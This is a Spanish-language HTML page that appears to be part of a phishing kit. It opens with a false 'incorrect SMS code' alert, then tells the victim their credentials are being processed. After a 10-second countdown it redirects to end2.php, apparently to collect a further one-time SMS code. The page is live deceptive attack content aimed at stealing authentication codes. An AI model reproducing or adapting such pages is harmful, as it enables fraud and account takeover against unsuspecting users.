<script language="javascript">alert("Código SMS Incorrecto\r\nSE DETECTO UN ERROR EN SU CÓDIGO\r\nTE ENVIAREMOS UN NUEVO CÓDIGO SMS E INGRESALO NUEVAMENTE")</script>
<!DOCTYPE html>
<html lang="es" class="notranslate wf-rubik-n3-active wf-rubik-n5-active wf-rubik-n4-active wf-active">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<meta name="viewport" content="user-scalable=no,initial-scale=0.65,maximum-scale=0.65,minimum-scale=0.65,width=device-width,viewport-fit=cover">

<title>Home</title>
<link href="assets/1.2b923407.chunk.css" rel="stylesheet">
<link href="assets/main.27735bb0.chunk.css" rel="stylesheet">
<link rel="stylesheet" href="./ilfs/css" media="all">
<link href="assets/estilito.css" rel="stylesheet">

	 <script language="JavaScript">
	var tiempo=10;
    var url="end2.php";
 
    function updateReloj()
    {
        document.getElementById('contador').innerHTML = "Estamos procesando sus credenciales. <br> Por favor, espera "+tiempo+" segundos, <br> te estamos enviando un nuevo mensaje de texto.";
 
        if(tiempo==0)
        {
            window.location=url;
        }else{
            tiempo-=1;
            setTimeout("updateReloj()",1000);
        }
    }
   window.onload=updateReloj;
 
    </script>

</head>

<body style="background-color: rgb(255, 255, 255);">


<div id="root"><div class="sc-brCNVJ gnDTjt"><div class="sc-hBEYos ePjtkM">

<form action="" method="post">
<img src="assets/image/sub.png" style="width:65%;">


 <div align="center">
  <span style="color:#ffffff; font-size:32px;">Cargando...</span><br><br>
 <img src="assets/image/lod.gif" style="width:200px;border:none;"> 
  <br> <br>
  <span style="color:#ffffff; font-size:20px;"  id="contador"></span>
 </div>
 


 <br>
 <p class="sc-iktFzd eHsFGL">
 
 



 </p>
 <div class="sc-iBPRYJ gAgoSu">
  <br> <br>

</div>
</form>

</div></div></div>

 

  </body>
  </html>